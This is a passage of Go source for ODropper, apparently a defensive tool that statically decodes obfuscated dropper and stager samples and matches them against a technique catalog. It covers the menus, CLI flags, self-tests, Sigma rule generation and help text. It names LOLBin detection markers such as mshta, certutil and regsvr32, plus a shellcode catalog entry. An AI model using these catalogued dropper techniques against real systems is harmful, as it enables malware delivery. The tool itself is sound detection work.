	sc, _ := catalogByID("DR-SHELLCODE")
	check("single marker is a downgraded weak signal", ids(w.Report)["DR-SHELLCODE"] == downgrade(sc.Severity, 2), ids(w.Report)["DR-SHELLCODE"]+" vs base "+sc.Severity)
	check("Sigma output uses tactic names", strings.Contains(generateSigma(), "attack.defense_evasion"), "")
	fmt.Println()
	if fail == 0 {
		okMsg(fmt.Sprintf("all %d self-tests passed", pass))
	} else {
		errMsg(fmt.Sprintf("%d passed, %d failed", pass, fail))
	}
	return fail == 0
}

// printLayers shows every decoded layer of the last analysis.
func printLayers(res analysisResult, max int) {
	for i, l := range res.Layers {
		if i == 0 {
			continue
		}
		fmt.Println("  " + col(fmt.Sprintf("[layer %d · depth %d] %s", i, l.Depth, l.Name), CY+B))
		t := l.Text
		if len(t) > max {
			t = t[:max] + " …"
		}
		for _, ln := range strings.Split(t, "\n") {
			fmt.Println("    " + col(ln, W))
		}
	}
	if len(res.Layers) <= 1 {
		info("no encoded layers found")
	}
}

var lastAnalysis *analysisResult

func showAnalysis(res analysisResult) {
	lastAnalysis = &res
	kind := "text"
	if res.Binary {
		kind = "binary (strings extracted)"
	}
	info(fmt.Sprintf("%s · entropy %.2f · %d decoded layer(s)", kind, res.Entropy, res.Decoded))
	if len(res.Chain) > 0 {
		warnMsg("kill chain: " + strings.Join(res.Chain, " → "))
	}
	fmt.Println()
	printFindings(res.Report)
}

var tuiActions = []struct {
	name, desc string
	run        func()
}{
	{"Analyze a sample", "Decode layers, techniques, chain, IOCs", func() {
		sectionHeader("Analyze dropper / stager sample")
		p := prompt("path to script, document, binary or strings dump")
		if p == "" {
			return
		}
		res, err := analyzePath(p, true)
		if err != nil {
			errMsg(err.Error())
			pause()
			return
		}
		showAnalysis(res)
		pause()
	}},
	{"Show decoded layers", "What each decoder recovered (last run)", func() {
		if lastAnalysis == nil {
			warnMsg("analyze a sample (or run the demo) first")
			pause()
			return
		}
		sectionHeader("Decoded layers")
		printLayers(*lastAnalysis, 600)
		pause()
	}},
	{"Run demo", "Inert macro → encoded PowerShell stager", func() { runDemo(); pause() }},
	{"Catalog browser", "Techniques, markers, detection, MITRE", interactiveBrowse},
	{"Catalog statistics", "Severity / category breakdown", func() { interactiveStats(); pause() }},
	{"ATT&CK coverage matrix", "Tactic / technique coverage", func() { attackCoverage(); pause() }},
	{"MITRE technique index", "Pivot the catalog by technique", menuShowMitre},
	{"Detection rules (Sigma)", "Generate Sigma rules from markers", menuSigma},
	{"Export last report", "txt / md / json / csv / sarif", interactiveExport},
	{"Self-test", "Decoder and detector checks", func() { runSelfTest(); pause() }},
}

func mainMenu() {
	for {
		items := make([]menuItem, len(tuiActions))
		for i, a := range tuiActions {
			items[i] = menuItem{key: fmt.Sprintf("%02d", i+1), name: a.name, desc: a.desc, clr: CY + B}
		}
		sel := strings.TrimSpace(menu(TAGLINE, items))
		if sel == "0" || sel == "00" || strings.EqualFold(sel, "q") || strings.EqualFold(sel, "exit") {
			clear()
			banner()
			okMsg("Session closed. Static analysis only — nothing was executed.")
			return
		}
		if strings.EqualFold(sel, "h") || strings.EqualFold(sel, "help") || sel == "?" {
			tuiHelp()
			continue
		}
		n, err := strconv.Atoi(sel)
		if err != nil || n < 1 || n > len(tuiActions) {
			if sel != "" {
				warnMsg("unknown selection")
				pause()
			}
			continue
		}
		clear()
		banner()
		tuiActions[n-1].run()
	}
}

// ====================================================================
//  CLI
// ====================================================================

func usage() {
	banner()
	fmt.Println("  " + col("USAGE", CY+B) + col("  "+APPNAME+" [flags]", W))
	fmt.Println()
	fmt.Println("  Run with no flags for the interactive cyan owl TUI.")
	fmt.Println()
	fmt.Println("  " + col("FLAGS", CY+B))
	flags := [][]string{
		{"-h, --help", "Show this help"},
		{"--version", "Print version and exit"},
		{"--howto", "Print the HOW TO USE screen (legal, steps, navigation)"},
		{"--demo", "Run a synthetic, self-contained demonstration"},
		{"--list", "List the full technique/binary catalog"},
		{"--search Q", "Search the catalog for Q"},
		{"--category C", "Filter catalog by category"},
		{"--platform P", "Filter catalog by platform"},
		{"--id ID", "Show a single catalog entry by ID"},
		{"--scan FILE", "Analyze FILE: decode layers, techniques, chain, IOCs"},
		{"--input FILE", "Alias for --scan (text, script, document or binary)"},
		{"--layers", "Also print every decoded layer"},
		{"--no-iocs", "Skip IOC extraction"},
		{"--selftest", "Run built-in self-tests (exit 0/1)"},
		{"--plan", "Print the whole catalog ranked by severity as a report"},
		{"--sigma", "Generate Sigma-style detection rules from the catalog"},
		{"--coverage", "Print an ATT&CK tactic coverage matrix"},
		{"--stats", "Print catalog statistics"},
		{"--format F", "Output format: txt|md|json|csv|sarif (default txt)"},
		{"--output FILE", "Write output to FILE instead of stdout"},
		{"--no-color", "Disable ANSI colors"},
	}
	for _, f := range flags {
		fmt.Printf("    %s  %s\n", col(pad(f[0], 16), W), col(f[1], GY))
	}
	fmt.Println()
	fmt.Println("  " + col("EXAMPLES", CY+B))
	fmt.Println("    " + col(APPNAME+" --scan invoice.ps1 --layers", GY))
	fmt.Println("    " + col(APPNAME+" --scan dropper.hta --format sarif --output out.sarif", GY))
	fmt.Println("    " + col(APPNAME+" --scan sample.exe --format json --output sample.json", GY))
	fmt.Println("    " + col(APPNAME+" --search mshta", GY))
	fmt.Println("    " + col(APPNAME+" --platform linux --format md", GY))
	fmt.Println("    " + col(APPNAME+" --id DR-MSHTA", GY))
	fmt.Println("    " + col(APPNAME+" --sigma --output dropper-rules.yml", GY))
	fmt.Println("    " + col(APPNAME+" --plan --format json", GY))
	fmt.Println()
	fmt.Println("  " + col("Primary MITRE: ", DIM) + col(PRIMARY_MITRE, CY) + col("   Authorized testing only.", GY))
}

func main() {
	var (
		fHelp    = flag.Bool("help", false, "")
		fH       = flag.Bool("h", false, "")
		fVersion = flag.Bool("version", false, "")
		fHowto   = flag.Bool("howto", false, "")
		fDemo    = flag.Bool("demo", false, "")
		fList    = flag.Bool("list", false, "")
		fStats   = flag.Bool("stats", false, "")
		fPlan    = flag.Bool("plan", false, "")
		fSigma   = flag.Bool("sigma", false, "")
		fCover   = flag.Bool("coverage", false, "")
		fSearch  = flag.String("search", "", "")
		fCat     = flag.String("category", "", "")
		fPlat    = flag.String("platform", "", "")
		fID      = flag.String("id", "", "")
		fScan    = flag.String("scan", "", "")
		fInput   = flag.String("input", "", "")
		fFormat  = flag.String("format", "txt", "")
		fOutput  = flag.String("output", "", "")
		fNoColor = flag.Bool("no-color", false, "")
		fSelf    = flag.Bool("selftest", false, "")
		fNoIOC   = flag.Bool("no-iocs", false, "")
		fLayers  = flag.Bool("layers", false, "")
	)
	flag.Usage = usage
	flag.Parse()

	if *fNoColor {
		noColor = true
	}

	switch {
	case *fHelp || *fH:
		usage()
		return
	case *fVersion:
		fmt.Printf("%s v%s — %s\n", APPNAME, VERSION, SUITE)
		fmt.Printf("Author : %s\nWebsite: %s\n", AUTHOR, WEBSITE)
		fmt.Println("Build  : Go stdlib, static (CGO disabled)")
		return
	case *fHowto:
		if noColor {
			fmt.Print(howtoText())
		} else {
			showHowto()
			fmt.Println()
		}
		return
	case *fSelf:
		if !runSelfTest() {
			os.Exit(1)
		}
		return
	case *fDemo:
		if *fOutput == "" && strings.ToLower(*fFormat) != "txt" {
			res := analyzeSample("demo-stager.vba", []byte(demoSample()), true)
			writeOut(renderReport(res.Report, *fFormat), "")
			return
		}
		runDemo()
		fmt.Println()
		return
	}

	scanTarget := *fScan
	if scanTarget == "" {
		scanTarget = *fInput
	}

	// CLI data operations that honor --format/--output
	if *fList {
		rep := buildReport("catalog", "catalog", catalogAsFindings())
		writeOut(renderReport(rep, *fFormat), *fOutput)
		return
	}
	if *fStats {
		printCatalogStatsText()
		return
	}
	if *fSearch != "" {
		entries := searchCatalog(*fSearch)
		rep := buildReport("search:"+*fSearch, "catalog", entriesToFindings(entries))
		writeOut(renderReport(rep, *fFormat), *fOutput)
		return
	}
	if *fCat != "" {
		entries := filterByCategory(*fCat)
		rep := buildReport("category:"+*fCat, "catalog", entriesToFindings(entries))
		writeOut(renderReport(rep, *fFormat), *fOutput)
		return
	}
	if *fPlat != "" {
		entries := filterByPlatform(*fPlat)
		rep := buildReport("platform:"+*fPlat, "catalog", entriesToFindings(entries))
		writeOut(renderReport(rep, *fFormat), *fOutput)
		return
	}
	if *fID != "" {
		if e, ok := catalogByID(*fID); ok {
			rep := buildReport("entry:"+*fID, "catalog", entriesToFindings([]CatalogEntry{e}))
			writeOut(renderReport(rep, *fFormat), *fOutput)
		} else {
			fmt.Fprintln(os.Stderr, "no entry with ID "+*fID)
			os.Exit(1)
		}
		return
	}
	if scanTarget != "" {
		res, err := analyzePath(scanTarget, !*fNoIOC)
		if err != nil {
			fmt.Fprintln(os.Stderr, "scan error: "+err.Error())
			os.Exit(1)
		}
		if *fLayers {
			printLayers(res, 4000)
			fmt.Println()
		}
		writeOut(renderReport(res.Report, *fFormat), *fOutput)
		if sc := severityCounts(res.Report.Findings); sc["critical"]+sc["high"] > 0 {
			os.Exit(3) // lets scripts/CI gate on a malicious verdict
		}
		return
	}
	if *fSigma {
		writeOut(generateSigma(), *fOutput)
		return
	}
	if *fCover {
		writeOut(attackCoverageText(), *fOutput)
		return
	}
	if *fPlan {
		rep := planReport()
		writeOut(renderReport(rep, *fFormat), *fOutput)
		return
	}

	// No flags -> interactive UI
	if noColor && !isatty() {
		// Non-interactive without flags: print help so piping is useful.
		usage()
		return
	}
	mainMenu()
}

// entriesToFindings converts catalog entries into findings for export.
func entriesToFindings(entries []CatalogEntry) []Finding {
	var fs []Finding
	for _, e := range entries {
		fs = append(fs, Finding{
			RuleID: e.ID, Title: e.Name, Severity: e.Severity,
			Score: sevWeight[strings.ToLower(e.Severity)], Tactic: e.Tactic,
			Technique: e.Technique, Detail: e.Summary,
			Detection: strings.Join(e.Detection, "; "), Refs: e.Refs,
			Fprint: fingerprint(e.ID),
		})
	}
	return fs
}

// printCatalogStatsText prints catalog stats as plain text (CLI).
func printCatalogStatsText() {
	bySev := map[string]int{}
	byCat := map[string]int{}
	markers := 0
	for _, e := range catalog {
		bySev[strings.ToLower(e.Severity)]++
		byCat[e.Category]++
		markers += len(e.Markers)
	}
	fmt.Printf("%s catalog: %d entries, %d markers, %d categories\n", APPNAME, len(catalog), markers, len(byCat))
	for _, s := range []string{"critical", "high", "medium", "low", "info"} {
		if bySev[s] > 0 {
			fmt.Printf("  %-9s %d\n", s, bySev[s])
		}
	}
	var cs []string
	for c := range byCat {
		cs = append(cs, c)
	}
	sort.Strings(cs)
	for _, c := range cs {
		fmt.Printf("  [cat] %-28s %d\n", c, byCat[c])
	}
}

// ---------------------------------------------------------------------------
// Help & Usage  (interactive menu [H])
// Page 1: in-app guide (what the tool does, every menu option, tips).
// Page 2: the full command-line reference (same text as --help).
// ---------------------------------------------------------------------------

type owlHelpItem struct{ key, text string }

func owlHelpWrap(s string, width int) []string {
	var out []string
	for _, para := range strings.Split(s, "\n") {
		words := strings.Fields(para)
		if len(words) == 0 {
			out = append(out, "")
			continue
		}
		cur := ""
		for _, w := range words {
			if cur != "" && len([]rune(cur))+1+len([]rune(w)) > width {
				out = append(out, cur)
				cur = w
			} else if cur == "" {
				cur = w
			} else {
				cur += " " + w
			}
		}
		out = append(out, cur)
	}
	return out
}

func owlHelpTitle(t string) {
	fmt.Println()
	fmt.Println("  " + col("▸ "+t, B+CY))
}

func owlHelpPara(lines []string) {
	for _, l := range lines {
		for _, w := range owlHelpWrap(l, 60) {
			fmt.Println("    " + col(w, W))
		}
	}
}

func owlHelpRows(items []owlHelpItem) {
	kw := 0
	for _, it := range items {
		if n := len([]rune(it.key)); n > kw {
			kw = n
		}
	}
	for _, it := range items {
		k := "[" + it.key + "]" + strings.Repeat(" ", kw-len([]rune(it.key)))
		for i, w := range owlHelpWrap(it.text, 56-kw) {
			if i == 0 {
				fmt.Println("    " + col(k, YLW+B) + "  " + col(w, W))
			} else {
				fmt.Println("    " + strings.Repeat(" ", kw+2) + "  " + col(w, W))
			}
		}
	}
}

func owlHelpRule() { fmt.Println(col(strings.Repeat("─", 66), CY)) }

func tuiHelp() {
	clear()
	banner()
	owlHelpRule()
	fmt.Println("  " + col("⬡  Help & Usage — "+APPNAME, B+CY))
	owlHelpRule()
	owlHelpTitle("WHAT IT DOES")
	owlHelpPara(owlHelpAbout)
	owlHelpTitle("HOW TO USE THE MENU")
	owlHelpPara(owlHelpFlow)
	owlHelpTitle("MENU OPTIONS")
	owlHelpRows(owlHelpMenu)
	owlHelpTitle("TIPS")
	owlHelpRows(owlHelpTips)
	fmt.Println()
	owlHelpRule()
	fmt.Println("  " + col("Next page: command-line flags & copy-paste examples", DIM))
	pause()
	clear()
	owlHelpCLI()
	fmt.Println()
	fmt.Println("  " + col("Tip: the same reference is printed by  "+APPNAME+" --help", DIM))
	pause()
}

var owlHelpAbout = []string{
	"ODropper analyses suspicious scripts, documents and binaries without running them (static analysis only). It peels off obfuscation layers such as PowerShell -EncodedCommand, base64, hex / \\x escapes, char-code arrays and split-string concatenation, up to 3 levels deep. It then matches the decoded text against a catalog of 45 dropper / stager techniques (Office macros, HTA, LNK, ISO, LOLBins like mshta / certutil / regsvr32, reflective loaders ...).",
	"The result is a severity grade, a download → execute kill chain, MITRE ATT&CK mapping, the decoded layers and extracted IOCs (URLs, IPs, domains, hashes). Binaries are handled too: their ASCII and UTF-16 strings are extracted first.",
}

var owlHelpFlow = []string{
	"Type the number of an option (1 or 01) and press Enter. Start with [01] and give it a sample, or run [03] to see a full example. [02] and [09] work on the last analysis. [04] to [08] explore the built-in technique catalog. [H] opens this help, [0] or q quits.",
}

var owlHelpMenu = []owlHelpItem{
	{"01", "Analyze a sample: enter the path of a script (.ps1 .vbs .js .hta .bat), document / macro dump, LNK, binary or strings dump. Shows the kill chain, matched techniques with severity, and IOCs."},
	{"02", "Show decoded layers: the text each decoder recovered from the last sample, layer by layer, so you can read the real payload."},
	{"03", "Run demo: an inert macro that launches an encoded PowerShell stager, analysed end to end."},
	{"04", "Catalog browser: list every technique, search by keyword, filter by category or platform (windows / linux / cross), or open one entry by ID (e.g. DR-MSHTA) to see its markers, detection advice and MITRE IDs."},
	{"05", "Catalog statistics: entries by severity, category and platform."},
	{"06", "ATT&CK coverage matrix: which MITRE tactics and techniques the catalog covers."},
	{"07", "MITRE technique index: the catalog grouped by technique ID."},
	{"08", "Detection rules (Sigma): generates Sigma-style detection rules from the catalog markers. Enter a file path to save them (blank = only show)."},
	{"09", "Export: choose L for the last analysis or c for the whole catalog, then the format (txt, md, json, csv, sarif) and an output file (blank = print to screen)."},
	{"10", "Self-test: decoder and detector checks."},
}

var owlHelpTips = []owlHelpItem{
	{"*", "One marker of a multi-marker technique is a weak signal. Full severity needs two markers, which reduces false positives."},
	{"*", "Download and execute primitives together raise a kill-chain finding (CRITICAL when evasion is also present)."},
	{"*", "Nothing is fetched or executed. Still, handle real malware only inside an isolated lab VM."},
	{"*", "The legal notes and protocol details are on page 3."},
}

func owlHelpCLI() {
	usage()
	pause()
	showHowto()
}
